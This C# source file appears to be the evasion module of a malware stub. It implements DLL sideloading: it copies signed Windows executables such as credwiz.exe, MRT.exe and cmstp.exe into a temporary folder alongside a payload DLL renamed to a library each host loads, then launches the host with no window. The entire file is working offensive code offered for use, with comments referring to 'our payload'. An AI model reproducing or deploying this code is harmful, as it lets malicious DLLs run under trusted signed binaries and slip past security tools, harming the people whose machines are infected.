using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace NRE.Stub.Evasion
{
    /// <summary>
    /// DLL sideloading: run a signed host executable from a directory that contains our payload DLL.
    /// </summary>
    public static class DllSideloading
    {
        private static readonly Tuple<string, string>[] KnownHosts = new Tuple<string, string>[]
        {
            Tuple.Create(@"C:\Windows\System32\credwiz.exe", "CRYPTBASE.dll"),
            Tuple.Create(@"C:\Windows\System32\MRT.exe", "wlbsctrl.dll"),
            Tuple.Create(@"C:\Windows\System32\cmstp.exe", "cmstp.dll"),
            Tuple.Create(@"C:\Program Files\Windows Photo Viewer\ImagingDevices.exe", "OLEACC.dll"),
        };

    /// <summary>
    /// Prepare a directory for sideloading: copy signed host and our payload DLL (with the name the host expects).
    /// Then start the host from that directory. Returns true if launch succeeded.
    /// </summary>
    /// <param name="payloadDllPath">Full path to our payload DLL (will be copied and optionally renamed).</param>
    /// <param name="targetDir">Directory to create and place host + DLL (e.g. %TEMP%\Sideload).</param>
    /// <param name="useKnownHost">If true, use first available known host; otherwise hostPath must be provided.</param>
    /// <param name="hostPath">Optional path to signed host exe (if not using known host).</param>
    public static bool RunSideload(string payloadDllPath, string targetDir = null, bool useKnownHost = true, string hostPath = null)
    {
        if (string.IsNullOrEmpty(payloadDllPath) || !File.Exists(payloadDllPath))
            return false;

        if (targetDir == null)
            targetDir = Path.Combine(Path.GetTempPath(), "Sideload_" + Guid.NewGuid().ToString("N").Substring(0, 8));
        Directory.CreateDirectory(targetDir);

        string hostExe;
        string dllName;

        if (useKnownHost)
        {
            var found = FindAvailableHost();
            if (found == null) return false;
            hostExe = found.Item1;
            dllName = found.Item2;
        }
        else
        {
            if (string.IsNullOrEmpty(hostPath) || !File.Exists(hostPath)) return false;
            hostExe = hostPath;
            dllName = Path.GetFileName(payloadDllPath);
        }

        try
        {
            string destHost = Path.Combine(targetDir, Path.GetFileName(hostExe));
            string destDll = Path.Combine(targetDir, dllName);
            File.Copy(hostExe, destHost, true);
            File.Copy(payloadDllPath, destDll, true);

            var psi = new ProcessStartInfo
            {
                FileName = destHost,
                WorkingDirectory = targetDir,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (Process.Start(psi)) { }
            return true;
        }
        catch
        {
            return false;
        }
    }

    /// <summary>
    /// Run sideload with a specific (host path, dll name) pair.
    /// </summary>
    public static bool RunSideloadExplicit(string hostExePath, string dllNameOurPayload, string payloadDllPath, string targetDir = null)
    {
        if (!File.Exists(hostExePath) || !File.Exists(payloadDllPath)) return false;
        if (targetDir == null)
            targetDir = Path.Combine(Path.GetTempPath(), "Sideload_" + Guid.NewGuid().ToString("N").Substring(0, 8));
        Directory.CreateDirectory(targetDir);
        try
        {
            string destHost = Path.Combine(targetDir, Path.GetFileName(hostExePath));
            string destDll = Path.Combine(targetDir, dllNameOurPayload);
            File.Copy(hostExePath, destHost, true);
            File.Copy(payloadDllPath, destDll, true);
            var psi = new ProcessStartInfo
            {
                FileName = destHost,
                WorkingDirectory = targetDir,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (Process.Start(psi)) { }
            return true;
        }
        catch
        {
            return false;
        }
    }

        private static Tuple<string, string> FindAvailableHost()
        {
            foreach (var t in KnownHosts)
            {
                if (File.Exists(t.Item1))
                    return t;
            }
            return null;
        }
    }
}
